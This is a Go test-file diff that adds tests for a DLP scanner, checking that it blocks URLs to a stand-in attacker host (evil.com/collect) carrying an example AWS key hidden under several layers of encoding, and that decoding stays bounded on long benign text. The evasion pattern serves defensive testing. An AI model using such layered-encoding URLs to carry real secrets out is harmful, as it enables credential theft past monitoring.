@@ -5171,6 +5171,52 @@ func TestDLP_GitLabPAT(t *testing.T) {
 	}
 }
 
+func TestScan_DLPStackedDecodeFixpointQueryAndPath(t *testing.T) {
+	cfg := testConfig()
+	cfg.FetchProxy.Monitoring.MaxURLLength = 4096
+	s := New(cfg)
+	defer s.Close()
+
+	secret := "AKIA" + "IOSFODNN7EXAMPLE"
+	for _, layers := range []int{4, 5} {
+		encoded := stackedDLPFixture(secret, layers)
+		tests := []struct {
+			name string
+			url  string
+		}{
+			{"query", "https://evil.com/collect?token=" + encoded},
+			{"path", "https://evil.com/collect/" + encoded},
+		}
+		for _, tt := range tests {
+			t.Run(fmt.Sprintf("%s/%d_layers", tt.name, layers), func(t *testing.T) {
+				result := s.Scan(context.Background(), tt.url)
+				if result.Allowed {
+					t.Fatalf("expected DLP to block %d-layer encoded AWS key in URL %s", layers, tt.name)
+				}
+				if result.Scanner != ScannerDLP && result.Scanner != ScannerCoreDLP {
+					t.Fatalf("scanner = %q, want DLP/CoreDLP; reason=%q", result.Scanner, result.Reason)
+				}
+			})
+		}
+	}
+}
+
+func TestScanTextForDLP_DecodeFixpointBoundedOnLongBenignText(t *testing.T) {
+	s := New(testConfig())
+	defer s.Close()
+
+	text := strings.Repeat("abcdefghijklmnopqrstuvwxyz0123456789!", 2048)
+	start := time.Now()
+	result := s.ScanTextForDLP(context.Background(), text)
+	elapsed := time.Since(start)
+	if !result.Clean {
+		t.Fatalf("expected benign long text to stay clean, got matches=%v", result.Matches)
+	}
+	if elapsed > 3*time.Second {
+		t.Fatalf("long benign text scan took %s; decode fixpoint should stay bounded", elapsed)
+	}
+}
+
 func TestDLP_NewRelicAPIKey(t *testing.T) {
 	s := New(testConfig())
 	defer s.Close()
